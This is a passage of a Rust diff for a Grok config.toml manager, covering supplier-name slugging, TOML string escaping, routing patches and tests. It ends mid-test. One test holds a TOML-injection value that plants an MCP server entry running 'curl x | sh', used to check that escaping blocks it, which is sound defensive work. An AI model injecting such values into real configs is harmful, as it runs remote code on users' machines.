@@ -1,5 +1,6 @@
 //! Grok Build live config helpers (`~/.grok/config.toml`).
-//! Grok Build live config read/write, with MCP section preservation.
+//! Enabling a supplier only patches `[models].default` and `[model."<id>"]`.
+//! Previous GUI supplier tables are pruned so switches do not stack identities.
 
 use std::fs;
 use std::path::PathBuf;
@@ -153,19 +154,60 @@ pub fn validate_for_switch(provider: &Provider) -> Result<(), String> {
     validate_custom(config)
 }
 
+/// Keep `[model.<id>]` / `[models].default` as a TOML-safe ASCII slug.
+/// Non-ASCII (including Chinese), spaces, and punctuation become `-`.
+/// Pure CJK / empty input gets a stable `p-<hash>` so two Chinese names
+/// do not collapse onto the same table key.
+pub fn sanitize_profile_name(name: &str) -> String {
+    let raw = name.trim();
+    let mut out = String::new();
+    for ch in raw.chars() {
+        if ch.is_ascii_alphanumeric() {
+            out.push(ch.to_ascii_lowercase());
+        } else if ch == '-' || ch == '_' || ch.is_whitespace() {
+            if !out.ends_with('-') {
+                out.push('-');
+            }
+        }
+    }
+    let trimmed = out.trim_matches('-');
+    if trimmed.is_empty() {
+        format!("p-{:08x}", fnv1a32(raw.as_bytes()))
+    } else {
+        trimmed.chars().take(32).collect()
+    }
+}
+
+fn fnv1a32(bytes: &[u8]) -> u32 {
+    let mut hash: u32 = 2_166_136_261;
+    for b in bytes {
+        hash ^= u32::from(*b);
+        hash = hash.wrapping_mul(16_777_619);
+    }
+    hash
+}
+
+fn identity_from(raw: &str) -> Option<String> {
+    let raw = raw.trim();
+    if raw.is_empty() || raw == LOCAL_PROXY_MODEL_ID {
+        return None;
+    }
+    let sanitized = sanitize_profile_name(raw);
+    if sanitized.is_empty() || sanitized == LOCAL_PROXY_MODEL_ID {
+        None
+    } else {
+        Some(sanitized)
+    }
+}
+
 /// Custom `[model."<id>"]` / `[models].default` identity.
-/// Prefer an explicit profile; otherwise the supplier name. Never `localproxy`
-/// (that key is reserved for live local-routing).
+/// Prefer an explicit profile; otherwise the supplier name. Both are
+/// slugified so Chinese / spaces / quotes never become a live table key.
+/// Never `localproxy` (that key is reserved for live local-routing).
 pub fn resolve_model_identity(profile: &str, provider_name: &str) -> String {
-    let profile = profile.trim();
-    if !profile.is_empty() && profile != LOCAL_PROXY_MODEL_ID {
-        return profile.to_string();
-    }
-    let name = provider_name.trim();
-    if !name.is_empty() && name != LOCAL_PROXY_MODEL_ID {
-        return name.to_string();
-    }
-    DEFAULT_MODEL.to_string()
+    identity_from(profile)
+        .or_else(|| identity_from(provider_name))
+        .unwrap_or_else(|| DEFAULT_MODEL.to_string())
 }
 
 /// Official `[model.<id>].name` = picker label. Never the supplier name.
@@ -252,8 +294,34 @@ pub fn normalize_api_backend(backend: &str) -> String {
     }
 }
 
+/// TOML basic-string encoding. Never interpolates raw user text (quotes,
+/// backslashes, and control chars are escaped) so a hostile model / name
+/// cannot inject extra TOML lines.
 fn toml_string(value: &str) -> String {
-    serde_json::to_string(value).unwrap_or_else(|_| format!("\"{value}\""))
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('"');
+    for ch in value.chars() {
+        match ch {
+            '"' => out.push_str("\\\""),
+            '\\' => out.push_str("\\\\"),
+            '\u{0008}' => out.push_str("\\b"),
+            '\t' => out.push_str("\\t"),
+            '\n' => out.push_str("\\n"),
+            '\u{000c}' => out.push_str("\\f"),
+            '\r' => out.push_str("\\r"),
+            c if c.is_control() => {
+                let n = c as u32;
+                if n <= 0xFFFF {
+                    out.push_str(&format!("\\u{n:04x}"));
+                } else {
+                    out.push_str(&format!("\\U{n:08x}"));
+                }
+            }
+            c => out.push(c),
+        }
+    }
+    out.push('"');
+    out
 }
 
 struct GrokFields {
@@ -266,30 +334,32 @@ struct GrokFields {
     context_window: i64,
 }
 
+/// `[models].default` is the catalog identity (table key), not the API model id.
+fn read_default_identity(config: &str) -> Option<String> {
+    config
+        .parse::<toml::Value>()
+        .ok()?
+        .get("models")?
+        .as_table()?
+        .get("default")?
+        .as_str()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(str::to_string)
+}
+
 fn extract_fields(config_toml: &str) -> Option<GrokFields> {
     let document = config_toml.parse::<toml::Value>().ok()?;
     let root = document.as_table()?;
     let model_entries = root.get("model")?.as_table()?;
-    let default_raw = root
+    let profile = root
         .get("models")
         .and_then(|v| v.as_table())
         .and_then(|t| t.get("default"))
         .and_then(|v| v.as_str())
         .map(str::trim)
-        .filter(|s| !s.is_empty());
-    let profile = match default_raw {
-        Some(key) if model_entries.get(key).and_then(|v| v.as_table()).is_some() => {
-            key.to_string()
-        }
-        _ if model_entries
-            .get(LOCAL_PROXY_MODEL_ID)
-            .and_then(|v| v.as_table())
-            .is_some() =>
-        {
-            LOCAL_PROXY_MODEL_ID.to_string()
-        }
-        _ => return None,
-    };
+        .filter(|s| !s.is_empty())?
+        .to_string();
     let selected = model_entries.get(&profile)?.as_table()?;
     let context_window = selected
         .get("context_window")
@@ -397,22 +467,13 @@ pub fn patch_config_from_form_with_picker(
         ));
     }
 
-    let old_default = existing
-        .parse::<toml::Value>()
-        .ok()
-        .and_then(|d| {
-            d.get("models")?
-                .get("default")?
-                .as_str()
-                .map(|s| s.trim().to_string())
-        })
-        .filter(|s| !s.is_empty());
+    let old_default = read_default_identity(existing);
 
     let mut doc = existing
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;
 
-    // [models].default
+    // [models].default 必须等于 identity
     {
         let root = doc.as_table_mut();
         if !root.contains_key("models") {
@@ -468,6 +529,8 @@ pub fn patch_config_from_form_with_picker(
             table.insert("api_key", toml_edit::value(api_key.trim()));
         }
 
+        // Previous GUI supplier + localproxy + leftover third-party routes go away.
+        // User extras without a custom endpoint stay.
         let mut drop = vec![LOCAL_PROXY_MODEL_ID.to_string()];
         if let Some(old) = old_default {
             if old != identity {
@@ -483,6 +546,15 @@ pub fn patch_config_from_form_with_picker(
     Ok(doc.to_string())
 }
 
+fn table_has_third_party_base_url(table: &dyn toml_edit::TableLike) -> bool {
+    table
+        .get("base_url")
+        .and_then(|i| i.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .is_some_and(|url| !is_official_base_url(url))
+}
+
 fn prune_model_tables(
     model_root: &mut dyn toml_edit::TableLike,
     keep: &str,
@@ -495,12 +567,25 @@ fn prune_model_tables(
         }
         if extra_drop.iter().any(|d| d == &key) {
             model_root.remove(&key);
+            continue;
+        }
+        // Leftover GUI supplier tables from earlier switches have a third-party
+        // base_url. Drop them so the Grok picker does not stack [model."A"] +
+        // [model."B"]. User extras without a custom endpoint stay.
+        let is_stale_route = model_root
+            .get(&key)
+            .and_then(|i| i.as_table_like())
+            .is_some_and(table_has_third_party_base_url);
+        if is_stale_route {
+            model_root.remove(&key);
         }
     }
 }
 
 #[derive(Debug, Clone)]
 pub struct LiveSnapshot {
+    /// `[models].default` catalog identity (table key), even when no matching table exists.
+    pub identity: Option<String>,
     pub base_url: Option<String>,
     pub model: Option<String>,
     pub has_api_key: bool,
@@ -512,6 +597,7 @@ pub fn read_live_snapshot() -> LiveSnapshot {
     let config = read_config_text().unwrap_or_default();
     let fields = extract_fields(&config);
     LiveSnapshot {
+        identity: read_default_identity(&config),
         base_url: fields.as_ref().map(|f| f.base_url.clone()),
         model: fields.as_ref().map(|f| f.model.clone()),
         has_api_key: fields.as_ref().and_then(|f| f.api_key.as_ref()).is_some(),
@@ -552,16 +638,26 @@ pub fn is_official_live_config(config_toml: &str) -> bool {
         }
     }
 
-    // Any [model.<id>] with a non-official base_url ⇒ third-party / BYOK proxy
-    if let Some(models) = root.get("model").and_then(|v| v.as_table()) {
-        for (_name, entry) in models {
-            let Some(table) = entry.as_table() else {
-                continue;
-            };
-            if let Some(url) = table.get("base_url").and_then(|v| v.as_str()) {
-                if !is_official_base_url(url) {
-                    return false;
-                }
+    // Only the *active* [models].default table counts. Unused [model.*]
+    // leftovers from a previous supplier must not mark live unofficial.
+    let default = root
+        .get("models")
+        .and_then(|v| v.as_table())
+        .and_then(|t| t.get("default"))
+        .and_then(|v| v.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    if let Some(id) = default {
+        if let Some(url) = root
+            .get("model")
+            .and_then(|v| v.as_table())
+            .and_then(|t| t.get(id))
+            .and_then(|v| v.as_table())
+            .and_then(|t| t.get("base_url"))
+            .and_then(|v| v.as_str())
+        {
+            if !is_official_base_url(url) {
+                return false;
             }
         }
     }
@@ -578,8 +674,34 @@ pub fn strip_to_official_routing(config_toml: &str) -> Result<String, String> {
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;
 
-    // Drop entire [model] table (custom endpoints). Built-in models need no table.
-    doc.as_table_mut().remove("model");
+    // Point [models].default at the built-in official model. Drop leftover
+    // GUI supplier tables (third-party base_url) and live-only localproxy.
+    // User extras without a custom endpoint stay.
+    {
+        let root = doc.as_table_mut();
+        if !root.contains_key("models") {
+            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
+        }
+        if let Some(models) = root.get_mut("models").and_then(|i| i.as_table_like_mut()) {
+            models.insert("default", toml_edit::value(DEFAULT_MODEL));
+        }
+    }
+    if let Some(model_root) = doc.get_mut("model").and_then(|i| i.as_table_like_mut()) {
+        prune_model_tables(
+            model_root,
+            DEFAULT_MODEL,
+            &[LOCAL_PROXY_MODEL_ID.to_string()],
+        );
+        let drop_official = model_root
+            .get(DEFAULT_MODEL)
+            .and_then(|i| i.as_table_like())
+            .and_then(|t| t.get("base_url"))
+            .and_then(|i| i.as_str())
+            .is_some_and(|url| !is_official_base_url(url));
+        if drop_official {
+            model_root.remove(DEFAULT_MODEL);
+        }
+    }
 
     // Drop non-official endpoints.models_base_url
     if let Some(endpoints) = doc
@@ -597,24 +719,6 @@ pub fn strip_to_official_routing(config_toml: &str) -> Result<String, String> {
         }
     }
 
-    // Ensure [models].default points at the official default when missing.
-    {
-        let root = doc.as_table_mut();
-        if !root.contains_key("models") {
-            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
-        }
-        if let Some(models) = root.get_mut("models").and_then(|i| i.as_table_like_mut()) {
-            let has_default = models
-                .get("default")
-                .and_then(|i| i.as_str())
-                .map(str::trim)
-                .is_some_and(|s| !s.is_empty());
-            if !has_default {
-                models.insert("default", toml_edit::value(DEFAULT_MODEL));
-            }
-        }
-    }
-
     let out = doc.to_string();
     if out.trim().is_empty() {
         return Ok(official_config_toml());
@@ -622,18 +726,23 @@ pub fn strip_to_official_routing(config_toml: &str) -> Result<String, String> {
     Ok(out)
 }
 
-/// Whether stored provider roughly matches live routing.
+/// Whether stored provider matches live routing.
 ///
-/// Compares **base_url** (and loose API-key presence). Do **not** compare
-/// default `model` — users switch models in Grok freely; that must not mark drift.
+/// Official: live has no third-party endpoint on the *active* `[models].default`.
+/// Custom: `[models].default` must equal the archive identity (table key), and
+/// `base_url` must match. Changing `.model` (API id) on the same table is not
+/// drift — that is the official way to pick a different upstream id.
 pub fn matches_live(provider: &Provider, live: &LiveSnapshot) -> bool {
     if provider.is_official() {
         return live.is_official_shape;
     }
+    let (identity, _, _) = summarize_extra(provider);
+    if live.identity.as_deref() != Some(identity.as_str()) {
+        return false;
+    }
     let (key, base, _model) = summarize(provider);
     match (base.as_deref(), live.base_url.as_deref()) {
         (Some(a), Some(b)) if a.trim_end_matches('/') == b.trim_end_matches('/') => {
-            // Key presence is soft: live may keep env/login material.
             key.is_some() == live.has_api_key || live.has_api_key || key.is_some()
         }
         (None, None) => true,
@@ -641,11 +750,131 @@ pub fn matches_live(provider: &Provider, live: &LiveSnapshot) -> bool {
     }
 }
 
-/// Merge provider archive into live while preserving unmanaged live sections.
-/// Routing keys owned by the archive: models / model / endpoints.
-fn merge_preserve_mcp(new_config: &str, live_config: &str) -> Result<String, String> {
-    // Prefer live as base so UI/tools/features survive; overlay archive routing.
-    merge_preserve_sections(new_config, live_config)
+/// Archive / editor fragment: `[models].default` + `[model."<identity>"]` only.
+pub fn extract_routing_fragment(config: &str) -> Result<String, String> {
+    if config.trim().is_empty() {
+        return Ok(String::new());
+    }
+    if let Some(f) = extract_fields(config) {
+        return Ok(build_custom_config_with_picker(
+            &f.profile,
+            &f.model,
+            &f.base_url,
+            &f.profile,
+            &f.name,
+            f.api_key.as_deref().unwrap_or(""),
+            &f.api_backend,
+            f.context_window,
+        ));
+    }
+    let src = config
+        .parse::<DocumentMut>()
+        .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;
+    let Some(default) = src
+        .get("models")
+        .and_then(|i| i.as_table())
+        .and_then(|t| t.get("default"))
+        .cloned()
+    else {
+        return Ok(String::new());
+    };
+    let mut out = DocumentMut::new();
+    let mut models = toml_edit::Table::new();
+    models.insert("default", default);
+    out.as_table_mut()
+        .insert("models", toml_edit::Item::Table(models));
+    Ok(out.to_string())
+}
+
+/// Patch only `[models].default` and `[model."<identity>"]` onto live.
+/// MCP / ui / features / tools stay as-is. Previous GUI supplier tables
+/// (and other leftover third-party routes) are removed so switching
+/// providers does not stack `[model."A"]` + `[model."B"]` in the picker.
+pub fn apply_routing_to_live(live: &str, archive: &str) -> Result<String, String> {
+    if archive.trim().is_empty() {
+        return Ok(live.to_string());
+    }
+    let Some(fields) = extract_fields(archive) else {
+        return Err("Grok 供应商档案缺少 [models].default / [model.\"…\"]".into());
+    };
+    if live.trim().is_empty() {
+        return extract_routing_fragment(archive);
+    }
+    let mut doc = live
+        .parse::<DocumentMut>()
+        .map_err(|e| format!("Invalid live Grok config.toml: {e}"))?;
+    apply_identity_nodes(&mut doc, &fields)?;
+    Ok(doc.to_string())
+}
+
+fn apply_identity_nodes(doc: &mut DocumentMut, fields: &GrokFields) -> Result<(), String> {
+    let old_default = doc
+        .get("models")
+        .and_then(|i| i.as_table())
+        .and_then(|t| t.get("default"))
+        .and_then(|i| i.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(str::to_string);
+    {
+        let root = doc.as_table_mut();
+        if !root.contains_key("models") {
+            root.insert("models", toml_edit::Item::Table(toml_edit::Table::new()));
+        }
+        let models = root
+            .get_mut("models")
+            .and_then(|i| i.as_table_like_mut())
+            .ok_or_else(|| "Grok config.toml 中 [models] 非法".to_string())?;
+        models.insert("default", toml_edit::value(fields.profile.as_str()));
+    }
+    {
+        let identity = fields.profile.as_str();
+        let root = doc.as_table_mut();
+        if !root.contains_key("model") {
+            let mut t = toml_edit::Table::new();
+            t.set_implicit(true);
+            root.insert("model", toml_edit::Item::Table(t));
+        }
+        let model_root = root
+            .get_mut("model")
+            .and_then(|i| i.as_table_like_mut())
+            .ok_or_else(|| "Grok config.toml 中 [model] 非法".to_string())?;
+        if model_root.get(identity).is_none() {
+            model_root.insert(identity, toml_edit::Item::Table(toml_edit::Table::new()));
+        }
+        let table = model_root
+            .get_mut(identity)
+            .and_then(|i| i.as_table_like_mut())
+            .ok_or_else(|| format!("Grok config.toml 中 [model.\"{identity}\"] 非法"))?;
+        table.insert("model", toml_edit::value(fields.model.as_str()));
+        table.insert("base_url", toml_edit::value(fields.base_url.as_str()));
+        table.insert("name", toml_edit::value(fields.name.as_str()));
+        table.insert(
+            "api_backend",
+            toml_edit::value(fields.api_backend.as_str()),
+        );
+        table.insert("context_window", toml_edit::value(fields.context_window));
+        if let Some(key) = fields
+            .api_key
+            .as_deref()
+            .map(str::trim)
+            .filter(|s| !s.is_empty())
+        {
+            table.insert("api_key", toml_edit::value(key));
+        }
+
+        let mut drop = vec![LOCAL_PROXY_MODEL_ID.to_string()];
+        if let Some(old) = old_default {
+            if old != identity {
+                drop.push(old);
+            }
+        }
+        if fields.model != identity {
+            drop.push(fields.model.clone());
+        }
+        prune_model_tables(model_root, identity, &drop);
+    }
+    Ok(())
 }
 
 pub fn write_live(provider: &Provider) -> Result<Vec<String>, String> {
@@ -680,12 +909,11 @@ pub fn write_live(provider: &Provider) -> Result<Vec<String>, String> {
                     archive.clone()
                 }
             } else {
-                let merged = merge_preserve_sections(&archive, live_existing)?;
-                strip_to_official_routing(&merged)?
+                strip_to_official_routing(live_existing)?
             };
             Ok(base)
         } else {
-            merge_preserve_mcp(&archive, live_existing)
+            apply_routing_to_live(live_existing, &archive)
         }
     })?;
 
@@ -696,41 +924,7 @@ pub fn write_live(provider: &Provider) -> Result<Vec<String>, String> {
     Ok(warnings)
 }
 
-/// Merge provider config into live while preserving non-model user sections
-/// (mcp, ui, features, tools, …) from live when the new config omits them.
-fn merge_preserve_sections(new_config: &str, live_config: &str) -> Result<String, String> {
-    let mut new_doc = if new_config.trim().is_empty() {
-        DocumentMut::new()
-    } else {
-        new_config
-            .parse::<DocumentMut>()
-            .map_err(|e| format!("Invalid Grok config.toml: {e}"))?
-    };
-    if live_config.trim().is_empty() {
-        return Ok(new_doc.to_string());
-    }
-    let live_doc = live_config
-        .parse::<DocumentMut>()
-        .map_err(|e| format!("Invalid live Grok config.toml: {e}"))?;
 
-    // Keys that official seed owns (routing). Everything else can be kept from live.
-    const SEED_KEYS: &[&str] = &["models", "model", "endpoints"];
-    for (key, item) in live_doc.as_table().iter() {
-        if SEED_KEYS.contains(&key) {
-            continue;
-        }
-        if new_doc.get(key).is_none() {
-            new_doc[key] = item.clone();
-        }
-    }
-    // Prefer live [models] extras but we'll re-assert default in strip.
-    if new_doc.get("models").is_none() {
-        if let Some(item) = live_doc.get("models") {
-            new_doc["models"] = item.clone();
-        }
-    }
-    Ok(new_doc.to_string())
-}
 
 fn backup_live(live_config: &str) -> Result<(), String> {
     if live_config.is_empty() {
@@ -774,23 +968,16 @@ pub fn backfill_from_live(provider: &mut Provider) -> Result<(), String> {
     if stored_base.as_deref() != Some(live_fields.base_url.as_str()) {
         return Ok(());
     }
-    // Strip MCP from stored profile (MCP stays live-only)
-    let stripped = strip_mcp(&live).unwrap_or(live);
+    // Store routing fragment only — MCP / ui / features stay live-only.
+    let fragment = extract_routing_fragment(&live).unwrap_or(live);
     if let Some(obj) = provider.settings_config.as_object_mut() {
-        obj.insert("config".into(), Value::String(stripped));
+        obj.insert("config".into(), Value::String(fragment));
     }
     provider.updated_at = Some(chrono::Utc::now().timestamp_millis());
     Ok(())
 }
 
-fn strip_mcp(config: &str) -> Result<String, String> {
-    let mut doc = config
-        .parse::<DocumentMut>()
-        .map_err(|e| format!("Invalid Grok config.toml: {e}"))?;
-    doc.as_table_mut().remove("mcp_servers");
-    doc.as_table_mut().remove("mcp");
-    Ok(doc.to_string())
-}
+
 
 pub fn settings_from_form(
     api_key: Option<&str>,
@@ -834,7 +1021,10 @@ pub fn settings_from_form(
 
     if advanced {
         let raw = raw_toml.ok_or_else(|| "高级模式需要填写 config.toml".to_string())?;
-        let mut text = raw.to_string();
+        let mut text = extract_routing_fragment(raw)?;
+        if text.trim().is_empty() {
+            return Err("高级 config.toml 中缺少 [models].default / [model.\"…\"]".into());
+        }
         // If key provided and differs, inject into TOML
         if let Some(fields) = extract_fields(&text) {
             if !key.is_empty() && fields.api_key.as_deref() != Some(key.as_str()) {
@@ -884,9 +1074,11 @@ pub fn settings_from_form(
         .and_then(|p| p.settings_config.get("config"))
         .and_then(|v| v.as_str())
         .unwrap_or("");
+    let existing_fragment =
+        extract_routing_fragment(existing_cfg).unwrap_or_else(|_| existing_cfg.to_string());
 
     let picker = resolve_picker_name(display_name.unwrap_or(""), model_val);
-    let text = if existing_cfg.trim().is_empty() {
+    let text = if existing_fragment.trim().is_empty() {
         build_custom_config_with_picker(
             &profile_val,
             model_val,
@@ -899,7 +1091,7 @@ pub fn settings_from_form(
         )
     } else {
         patch_config_from_form_with_picker(
-            existing_cfg,
+            &existing_fragment,
             &profile_val,
             model_val,
             url,
@@ -975,65 +1167,104 @@ pub fn summarize_picker_name(provider: &Provider) -> String {
 mod tests {
     use super::*;
 
+    fn custom_provider(config: &str) -> Provider {
+        Provider::new(
+            "g-custom".into(),
+            "中转 · goaiaog".into(),
+            json!({ "config": config }),
+        )
+    }
+
     #[test]
-    fn matches_live_ignores_default_model_switch() {
-        // Archive default model A; live user switched to model B — same base_url.
+    fn matches_live_requires_default_identity() {
         let archive_cfg = r#"
 [models]
-default = "model-a"
+default = "中转 · goaiaog"
 
-[model."model-a"]
-model = "model-a"
+[model."中转 · goaiaog"]
+model = "grok-4.5"
 base_url = "https://proxy.example.com/v1"
+name = "grok-4.5"
 api_key = "sk-test"
 api_backend = "responses"
 context_window = 200000
 "#;
-        let live_cfg = r#"
-[models]
-default = "model-b"
+        let provider = custom_provider(archive_cfg);
 
-[model."model-b"]
-model = "model-b"
-base_url = "https://proxy.example.com/v1"
-api_key = "sk-test"
-api_backend = "responses"
-context_window = 200000
-
-[model."model-a"]
-model = "model-a"
-base_url = "https://proxy.example.com/v1"
-api_key = "sk-test"
-api_backend = "responses"
-context_window = 200000
-"#;
-        let provider = Provider::new(
-            "g-custom".into(),
-            "Custom".into(),
-            json!({ "config": archive_cfg }),
-        );
-        // Live snapshot as if user switched models in Grok GUI.
-        let live = LiveSnapshot {
+        // Same identity + same base_url + different API id is not drift.
+        let live_same = LiveSnapshot {
+            identity: Some("中转 · goaiaog".into()),
             base_url: Some("https://proxy.example.com/v1".into()),
-            model: Some("model-b".into()),
-            has_api_key: true,
-            config_exists: true,
-            is_official_shape: is_official_live_config(live_cfg),
-        };
-        assert!(
-            matches_live(&provider, &live),
-            "switching models.default must not mark 本机漂移 when base_url is unchanged"
-        );
-
-        // Different base_url should still be drift.
-        let live_other = LiveSnapshot {
-            base_url: Some("https://other.example.com/v1".into()),
-            model: Some("model-a".into()),
+            model: Some("grok-4.6".into()),
             has_api_key: true,
             config_exists: true,
             is_official_shape: false,
         };
-        assert!(!matches_live(&provider, &live_other));
+        assert!(
+            matches_live(&provider, &live_same),
+            "changing [model].model (API id) must not mark drift"
+        );
+
+        // default pointed at another catalog identity — even same base_url — is drift.
+        let live_other_id = LiveSnapshot {
+            identity: Some("model-b".into()),
+            base_url: Some("https://proxy.example.com/v1".into()),
+            model: Some("grok-4.6".into()),
+            has_api_key: true,
+            config_exists: true,
+            is_official_shape: false,
+        };
+        assert!(
+            !matches_live(&provider, &live_other_id),
+            "default identity change must mark drift"
+        );
+
+        // Official default with leftover custom table: live is official; custom does not match.
+        let official_default = r#"
+[models]
+default = "grok-4.6"
+
+[model."中转 · goaiaog"]
+model = "grok-4.6"
+base_url = "https://proxy.example.com/v1"
+name = "grok-4.6"
+api_key = "sk-test"
+api_backend = "responses"
+context_window = 200000
+"#;
+        assert!(
+            is_official_live_config(official_default),
+            "default = built-in id with no matching third-party table is official"
+        );
+        assert!(extract_fields(official_default).is_none());
+        let live_official = LiveSnapshot {
+            identity: None,
+            base_url: None,
+            model: None,
+            has_api_key: false,
+            config_exists: true,
+            is_official_shape: true,
+        };
+        assert!(!matches_live(&provider, &live_official));
+
+        let mut official = Provider::new(
+            "grok-official".into(),
+            "Grok Official".into(),
+            official_settings_config(),
+        );
+        official.category = Some("official".into());
+        assert!(matches_live(&official, &live_official));
+
+        // Different base_url is still drift.
+        let live_other_url = LiveSnapshot {
+            identity: Some("中转 · goaiaog".into()),
+            base_url: Some("https://other.example.com/v1".into()),
+            model: Some("grok-4.5".into()),
+            has_api_key: true,
+            config_exists: true,
+            is_official_shape: false,
+        };
+        assert!(!matches_live(&provider, &live_other_url));
     }
 
     #[test]
@@ -1061,12 +1292,37 @@ base_url = "https://proxy.example.com/v1"
 api_key = "sk-test"
 api_backend = "responses"
 context_window = 500000
+
+[model."Old Relay"]
+model = "grok-old"
+base_url = "https://old.example.com/v1"
+name = "old"
+api_key = "sk-old"
+api_backend = "responses"
+context_window = 100000
+
+[model."user-extra"]
+model = "keep"
+name = "keep"
+
+[mcp]
+enabled = true
 "#;
         assert!(!is_official_live_config(third));
         let cleaned = strip_to_official_routing(third).expect("strip");
         assert!(is_official_live_config(&cleaned));
         assert!(!cleaned.contains("proxy.example.com"));
+        assert!(!cleaned.contains("old.example.com"));
         assert!(cleaned.contains("grok-4.5"));
+        assert!(
+            !cleaned.contains("[model.\"Old Relay\"]"),
+            "previous GUI supplier must be pruned: {cleaned}"
+        );
+        assert!(
+            cleaned.contains("[model.\"user-extra\"]"),
+            "user extras without a custom endpoint stay: {cleaned}"
+        );
+        assert!(cleaned.contains("[mcp]"), "MCP stays: {cleaned}");
     }
 
     #[test]
@@ -1123,13 +1379,29 @@ context_window = 500000
     }
 
     #[test]
-    fn identity_defaults_to_supplier_name_not_upstream_model() {
-        assert_eq!(resolve_model_identity("", "OpenRouter (Grok)"), "OpenRouter (Grok)");
-        assert_eq!(resolve_model_identity("my-relay", "OpenRouter (Grok)"), "my-relay");
+    fn identity_slugifies_supplier_name_not_upstream_model() {
+        assert_eq!(
+            resolve_model_identity("", "OpenRouter (Grok)"),
+            "openrouter-grok"
+        );
+        assert_eq!(
+            resolve_model_identity("my-relay", "OpenRouter (Grok)"),
+            "my-relay"
+        );
         assert_eq!(
             resolve_model_identity(LOCAL_PROXY_MODEL_ID, "OpenRouter (Grok)"),
-            "OpenRouter (Grok)"
+            "openrouter-grok"
         );
+        assert_eq!(
+            resolve_model_identity("", "中转 · goaiaog"),
+            "goaiaog"
+        );
+        let cjk = resolve_model_identity("", "硅基流动");
+        assert!(
+            cjk.starts_with("p-") && cjk.len() == 10,
+            "pure CJK must hash, got {cjk}"
+        );
+        assert_ne!(cjk, resolve_model_identity("", "智谱清言"));
 
         let settings = settings_from_form(
             Some("sk-test"),
@@ -1149,13 +1421,13 @@ context_window = 500000
         .expect("save");
         let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
         assert!(
-            config.contains("default = \"OpenRouter (Grok)\"")
-                || config.contains("default = 'OpenRouter (Grok)'"),
+            config.contains("default = \"openrouter-grok\""),
             "{config}"
         );
         assert!(
-            config.contains("[model.\"OpenRouter (Grok)\"]"),
-            "table key must be supplier name: {config}"
+            config.contains("[model.\"openrouter-grok\"]")
+                || config.contains("[model.openrouter-grok]"),
+            "table key must be slugified supplier name: {config}"
         );
         assert!(config.contains("model = \"x-ai/grok-4.5\""));
         assert!(
@@ -1170,6 +1442,41 @@ context_window = 500000
             !config.contains("[model.\"x-ai/grok-4.5\"]"),
             "upstream id must not become a table key: {config}"
         );
+        assert!(
+            !config.contains("[model.\"OpenRouter (Grok)\"]"),
+            "raw supplier name must not be a table key: {config}"
+        );
+    }
+
+    #[test]
+    fn toml_string_escapes_hostile_values() {
+        let hostile = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh";
+        let encoded = toml_string(hostile);
+        assert_eq!(
+            encoded,
+            "\"evil\\\"\\n[mcp_servers.pwn]\\ncommand = \\\"curl x | sh\""
+        );
+        let built = build_custom_config_with_picker(
+            "relay",
+            hostile,
+            "https://example.com/v1",
+            "Relay",
+            hostile,
+            "sk-test",
+            "responses",
+            100_000,
+        );
+        assert!(
+            !built.lines().any(|l| l == "[mcp_servers.pwn]"),
+            "must not inject a TOML table: {built}"
+        );
+        let parsed: toml::Value = built.parse().expect("valid toml");
+        let table = parsed
+            .get("model")
+            .and_then(|v| v.get("relay"))
+            .and_then(|v| v.as_table())
+            .expect("relay table");
+        assert_eq!(table.get("model").and_then(|v| v.as_str()), Some(hostile));
     }
 
     #[test]
@@ -1205,8 +1512,11 @@ context_window = 500000
             500_000,
         )
         .expect("patch");
-        assert!(patched.contains("[model.\"My Relay\"]"), "{patched}");
-        assert!(patched.contains("default = \"My Relay\""), "{patched}");
+        assert!(
+            patched.contains("[model.\"my-relay\"]") || patched.contains("[model.my-relay]"),
+            "{patched}"
+        );
+        assert!(patched.contains("default = \"my-relay\""), "{patched}");
         assert!(!patched.contains("[model.\"grok-4.5\"]"), "{patched}");
         assert!(!patched.contains("[model.\"localproxy\"]"), "{patched}");
         assert!(
@@ -1216,8 +1526,8 @@ context_window = 500000
     }
 
     #[test]
-    fn extract_fields_falls_back_when_model_key_missing() {
-        let cfg = r#"
+    fn extract_fields_requires_default_to_match_table() {
+        let aligned = r#"
 [models]
 default = "localproxy"
 
@@ -1228,9 +1538,162 @@ api_key = "PROXY_MANAGED"
 api_backend = "responses"
 context_window = 500000
 "#;
-        let fields = extract_fields(cfg).expect("extract");
+        let fields = extract_fields(aligned).expect("extract");
         assert_eq!(fields.profile, "localproxy");
         assert_eq!(fields.model, "localproxy");
         assert_eq!(fields.base_url, "http://127.0.0.1:18964/grok/v1");
+
+        // Official default with a leftover custom table is not that table.
+        let mismatched = r#"
+[models]
+default = "grok-4.6"
+
+[model."中转 · goaiaog"]
+model = "grok-4.6"
+base_url = "https://sub.example.com/v1"
+name = "grok-4.6"
+api_key = "sk-test"
+api_backend = "responses"
+context_window = 500000
+"#;
+        assert!(extract_fields(mismatched).is_none());
+        assert_eq!(read_default_identity(mismatched).as_deref(), Some("grok-4.6"));
+    }
+
+    #[test]
+    fn apply_routing_only_patches_models_default_and_identity_table() {
+        let live = r#"
+[models]
+default = "old-relay"
+keep_me = true
+
+[model."old-relay"]
+model = "grok-old"
+base_url = "https://old.example.com/v1"
+name = "old"
+api_key = "sk-old"
+api_backend = "responses"
+context_window = 100000
+
+[model."Earlier Relay"]
+model = "grok-earlier"
+base_url = "https://earlier.example.com/v1"
+name = "earlier"
+api_key = "sk-earlier"
+api_backend = "responses"
+context_window = 100000
+
+[model."user-extra"]
+model = "keep"
+name = "keep"
+
+[mcp]
+enabled = true
+
+[ui]
+theme = "dark"
+"#;
+        let archive = r#"
+[models]
+default = "New Relay"
+
+[model."New Relay"]
+model = "grok-new"
+base_url = "https://new.example.com/v1"
+name = "grok-new"
+api_key = "sk-new"
+api_backend = "responses"
+context_window = 256000
+
+[mcp]
+enabled = false
+"#;
+        let out = apply_routing_to_live(live, archive).expect("apply");
